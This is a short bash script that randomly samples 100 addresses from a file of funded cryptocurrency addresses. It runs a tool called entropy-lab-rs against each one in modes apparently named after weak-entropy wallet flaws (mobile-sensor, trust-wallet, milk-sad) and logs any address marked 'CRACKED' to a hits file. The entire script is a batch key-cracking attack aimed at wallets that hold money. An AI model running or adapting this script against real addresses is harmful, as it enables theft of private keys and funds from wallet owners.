#!/bin/bash
cd ~/entropy-lab-rs
source ~/.cargo/env
shuf -n 100 ~/funded_addresses.txt > targets.txt
count=0
while read addr; do
    count=$((count + 1))
    echo "[$count/100] $addr"
    timeout 10s ./target/release/entropy-lab-rs mobile-sensor --target "$addr" | grep CRACKED && echo "$addr MOBILE" >> HITS.txt
    timeout 120s ./target/release/entropy-lab-rs trust-wallet --target "$addr" | grep CRACKED && echo "$addr TRUST" >> HITS.txt
    timeout 300s ./target/release/entropy-lab-rs milk-sad --target "$addr" | grep CRACKED && echo "$addr MILK" >> HITS.txt
done < targets.txt
echo "Done: $count addresses"
